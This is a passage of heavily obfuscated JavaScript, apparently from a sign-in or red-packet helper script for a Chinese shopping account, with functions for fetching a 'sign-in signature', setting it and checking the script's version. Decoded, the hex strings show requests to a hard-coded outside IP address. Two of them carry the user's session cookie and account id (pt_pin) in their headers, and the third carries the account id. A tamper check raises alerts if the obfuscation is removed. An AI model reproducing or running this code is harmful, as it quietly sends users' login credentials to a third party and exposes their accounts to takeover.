function(_0xaf87xe,_0xaf87x7){return _0xaf87xe+ _0xaf87x7};_0xaf87xb= _0xaf87x9(__Oxdbe9b[0x7],_0xaf87x9(_0xaf87x9(__Oxdbe9b[0x8],__Oxdbe9b[0x9]),__Oxdbe9b[0xa]));try{_0xaf87x7= __encode;if(!( typeof _0xaf87x7!== _0xaf87xc&& _0xaf87x7=== _0xaf87x9(__Oxdbe9b[0xb],__Oxdbe9b[0xc]))){_0xaf87xa(_0xaf87xb)}}catch(e){_0xaf87xa(_0xaf87xb)}})({})
//签到签名获取
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdbe8f=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x67\x65\x74\x6D\x73","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function GetsignRedPackage(_0x164ex2){return  new Promise((_0x164ex3)=>{$[__Oxdbe8f[0x4]]({url:__Oxdbe8f[0x0],headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x164ex2}},(_0x164ex4,_0x164ex5,_0x164ex6)=>{try{_0x164ex6= JSON[__Oxdbe8f[0x1]](_0x164ex6)}catch(e){$[__Oxdbe8f[0x3]](__Oxdbe8f[0x2],e,_0x164ex5)}finally{_0x164ex3(_0x164ex6)}})})}(function(_0x164ex7,_0x164ex8,_0x164ex9,_0x164exa,_0x164exb,_0x164exc){_0x164exc= __Oxdbe8f[0x5];_0x164exa= function(_0x164exd){if( typeof alert!== _0x164exc){alert(_0x164exd)};if( typeof console!== _0x164exc){console[__Oxdbe8f[0x6]](_0x164exd)}};_0x164ex9= function(_0x164exe,_0x164ex7){return _0x164exe+ _0x164ex7};_0x164exb= _0x164ex9(__Oxdbe8f[0x7],_0x164ex9(_0x164ex9(__Oxdbe8f[0x8],__Oxdbe8f[0x9]),__Oxdbe8f[0xa]));try{_0x164ex7= __encode;if(!( typeof _0x164ex7!== _0x164exc&& _0x164ex7=== _0x164ex9(__Oxdbe8f[0xb],__Oxdbe8f[0xc]))){_0x164exa(_0x164exb)}}catch(e){_0x164exa(_0x164exb)}})({})
//签到签名设置
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdbe9c=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x73\x65\x74\x67\x65\x74\x6D\x73","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function SetsignRedPackage(_0x7a19x2){return  new Promise((_0x7a19x3)=>{$[__Oxdbe9c[0x4]]({url:`${__Oxdbe9c[0x0]}`,headers:{"\x70\x74\x5F\x70\x69\x6E":_0x7a19x2,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x7a19x4,_0x7a19x5,_0x7a19x6)=>{try{_0x7a19x6= JSON[__Oxdbe9c[0x1]](_0x7a19x6)}catch(e){$[__Oxdbe9c[0x3]](__Oxdbe9c[0x2],e,_0x7a19x5)}finally{_0x7a19x3(_0x7a19x6)}})})}(function(_0x7a19x7,_0x7a19x8,_0x7a19x9,_0x7a19xa,_0x7a19xb,_0x7a19xc){_0x7a19xc= __Oxdbe9c[0x5];_0x7a19xa= function(_0x7a19xd){if( typeof alert!== _0x7a19xc){alert(_0x7a19xd)};if( typeof console!== _0x7a19xc){console[__Oxdbe9c[0x6]](_0x7a19xd)}};_0x7a19x9= function(_0x7a19xe,_0x7a19x7){return _0x7a19xe+ _0x7a19x7};_0x7a19xb= _0x7a19x9(__Oxdbe9c[0x7],_0x7a19x9(_0x7a19x9(__Oxdbe9c[0x8],__Oxdbe9c[0x9]),__Oxdbe9c[0xa]));try{_0x7a19x7= __encode;if(!( typeof _0x7a19x7!== _0x7a19xc&& _0x7a19x7=== _0x7a19x9(__Oxdbe9c[0xb],__Oxdbe9c[0xc]))){_0x7a19xa(_0x7a19xb)}}catch(e){_0x7a19xa(_0x7a19xb)}})({})
//版本检测，保证代码最新
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})
